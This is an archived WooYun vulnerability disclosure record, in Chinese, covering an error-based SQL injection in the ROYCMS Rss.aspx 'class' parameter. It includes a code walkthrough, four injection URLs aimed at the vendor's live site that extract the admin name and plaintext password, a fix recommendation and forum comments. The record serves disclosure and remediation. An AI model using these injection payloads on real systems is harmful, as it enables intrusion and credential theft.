{"id": 64942, "wybug_id": "wooyun-2013-021098", "wybug_title": "ROYCMS漏洞之四，错误回显的SQL注入漏洞，直接秒杀管理员密码，部分用户密码明文存储", "wybug_corp": "roycms.cn", "wybug_author": "wefgod", "wybug_date": "2013-04-01 22:25", "wybug_open_date": "2013-06-30 22:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "注射漏洞利用技巧", "注射", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-30：\t细节向公众公开  简要描述： 上次第三个漏洞被忽视了，真伤心。这次主要从代码上简单看看这套CMS的一个注入问题。当然了，服务器的狗狗挺碍事的，不过好在是老版本，基本上是畅通无阻的。其它请看后面的说明（别怪我标题长，对不住各位的眼睛了……） 详细说明：  问题文件：ROYcms.UI.Admin\\App_Api\\Rss.aspx.cs主要是参数class产生的问题\nif (Request[\"class\"] != null){DataSet ds = ___ROYcms_news_Bll.GetList(\" classname='\" + Request[\"class\"] + \"' \");…}\n另外，在该文件中可以看见该Rss类继承的是ROYcms.BasePage这个父类，在BasePage.cs中可以看见___ROYcms_news_Bll的定义为：\npublic ROYcms.Sys.BLL.ROYcms_news ___ROYcms_news_Bll = new ROYcms.Sys.BLL.ROYcms_news();\n在ROYcms.Sys\\BLL下找到ROYcms_news.cs文件，其中可以看见GetList方法的相关信息：\npublic DataSet GetList(string strWhere){\treturn dal.GetList(strWhere);\t}\nDal的定义为：\nprivate readonly ROYcms.Sys.DAL.ROYcms_news dal=new ROYcms.Sys.DAL.ROYcms_news();\n在ROYcms.Sys\\Dal下找到ROYcms_news.cs文件，进一步找到GetList方法：\npublic DataSet GetList(string strWhere){     StringBuilder strSql = new StringBuilder();     strSql.Append(\"select * \");     strSql.Append(\" FROM \"+PubConstant.date_prefix+\"news \");     if (strWhere.Trim() != \"\")     {          strSql.Append(\" where \" + strWhere);      }      return ROYcms.DB.DbHelpers.GetDataSet(strSql.ToString());}\n这是一个利用StringBuilder拼凑起来的sql查询，会产生SQL是毫无疑问的，下一步就回到官网测试   漏洞证明：  测试1：http://www.roycms.cn/App_Api/Rss.aspx?class=1'%00 and @@version>0 and '1'='1\n\n测试2：http://www.roycms.cn/App_Api/Rss.aspx?class=1'%00 and user>0 and '1'='1\n\n测试3：http://www.roycms.cn/App_Api/Rss.aspx?class=1'%00 and (select top 1 name from ROYcms_user)>0 and '1'='1\n\n测试4：http://www.roycms.cn/App_Api/Rss.aspx?class=1'%00 and (select top 1 password from ROYcms_user)>0 and '1'='1（明文密码，具体不贴图了）   修复方案：  过滤或者参数化的查询。在某些地方是参数化查询了，但是在这没有用上   版权声明：转载请注明来源 wefgod@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-04-01 23:15 厂商回复： ------------ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-05-02 07:09 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n  此页面有问题？    \n     2013-05-02 11:00 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @廷廷 什么意思？    \n     2013-05-02 14:21 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n  @wefgod 2013-04-21：\t细节向普通白帽子公开，可我只是实习的，却能看到内容。。。    \n     2013-05-02 14:36 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n  @wefgod 2013-04-21：\t细节向普通白帽子公开，可我只是实习的，却能看到内容。。。    \n     2013-05-02 15:09 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @廷廷 哈哈，这样啊，@xsser 剑心大牛求解释。    \n     2013-05-02 16:34 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @廷廷 @wefgod hi 抱歉，已经修复了 在调整那个通用漏洞流程，所以时间显示上会有10天的延迟，实际上也没有造成影响，谢谢！ ：）    \n     2013-05-02 17:58 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @xsser 辛苦了    \n     2014-04-09 12:06 |    \t\tSleshep \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 隼)\t\t \n  都1年了,还没修复啊,注入点还在呢@xsser    \n     2014-04-09 12:11 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Sleshep 厂商不打算修复了，随他吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}